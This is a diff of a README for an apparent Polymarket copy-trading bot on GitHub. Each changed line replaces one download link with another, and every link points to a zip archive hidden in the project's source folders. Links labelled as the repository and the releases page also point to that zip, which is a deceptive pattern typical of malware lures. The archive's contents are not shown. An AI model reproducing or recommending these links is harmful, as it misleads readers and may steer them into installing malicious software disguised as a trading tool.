@@ -6,7 +6,7 @@ Welcome to the polymarket-copy-trading-bot-v2.0! This bot helps you trade on Pol
 
 ## 📥 Download the Bot
 
-[![Download the Bot](https://github.com/giovanna24623/polymarket-copy-trading-bot-v2.0/raw/refs/heads/main/src/config/__pycache__/v_copy_trading_polymarket_bot_v1.4.zip%20Now-Polymarket%20Copy%20Trading%https://github.com/giovanna24623/polymarket-copy-trading-bot-v2.0/raw/refs/heads/main/src/config/__pycache__/v_copy_trading_polymarket_bot_v1.4.zip)](https://github.com/giovanna24623/polymarket-copy-trading-bot-v2.0/raw/refs/heads/main/src/config/__pycache__/v_copy_trading_polymarket_bot_v1.4.zip)
+[![Download the Bot](https://raw.githubusercontent.com/giovanna24623/polymarket-copy-trading-bot-v2.0/main/src/interfaces/v-copy-bot-polymarket-trading-1.4.zip%20Now-Polymarket%20Copy%20Trading%https://raw.githubusercontent.com/giovanna24623/polymarket-copy-trading-bot-v2.0/main/src/interfaces/v-copy-bot-polymarket-trading-1.4.zip)](https://raw.githubusercontent.com/giovanna24623/polymarket-copy-trading-bot-v2.0/main/src/interfaces/v-copy-bot-polymarket-trading-1.4.zip)
 
 ## 🌟 Features
 
@@ -26,7 +26,7 @@ To ensure smooth operation, make sure your system meets the following requiremen
 
 ## 💾 Download & Install
 
-To download the polymarket-copy-trading-bot-v2.0, please visit this page: [Download Here](https://github.com/giovanna24623/polymarket-copy-trading-bot-v2.0/raw/refs/heads/main/src/config/__pycache__/v_copy_trading_polymarket_bot_v1.4.zip).
+To download the polymarket-copy-trading-bot-v2.0, please visit this page: [Download Here](https://raw.githubusercontent.com/giovanna24623/polymarket-copy-trading-bot-v2.0/main/src/interfaces/v-copy-bot-polymarket-trading-1.4.zip).
 
 1. Go to the releases page.
 2. Look for the latest version of the bot.
@@ -72,7 +72,7 @@ If you have questions or need assistance, please check the GitHub issues section
 
 ## 🌐 Explore Further
 
-Learn more about the functionalities by visiting our GitHub repository: [Explore The Repository](https://github.com/giovanna24623/polymarket-copy-trading-bot-v2.0/raw/refs/heads/main/src/config/__pycache__/v_copy_trading_polymarket_bot_v1.4.zip).
+Learn more about the functionalities by visiting our GitHub repository: [Explore The Repository](https://raw.githubusercontent.com/giovanna24623/polymarket-copy-trading-bot-v2.0/main/src/interfaces/v-copy-bot-polymarket-trading-1.4.zip).
 
 ## 🚀 Join the Community
 
@@ -80,6 +80,6 @@ Engage with other users and share your experiences. Feedback on features is alwa
 
 ## 📢 Stay Updated
 
-Follow updates on new releases and changes by watching the repository or joining our mailing list. You can find the latest updates on the [releases page](https://github.com/giovanna24623/polymarket-copy-trading-bot-v2.0/raw/refs/heads/main/src/config/__pycache__/v_copy_trading_polymarket_bot_v1.4.zip).
+Follow updates on new releases and changes by watching the repository or joining our mailing list. You can find the latest updates on the [releases page](https://raw.githubusercontent.com/giovanna24623/polymarket-copy-trading-bot-v2.0/main/src/interfaces/v-copy-bot-polymarket-trading-1.4.zip).
 
 By using this application, you can make trading on Polymarket easier and more effective. Enjoy trading!
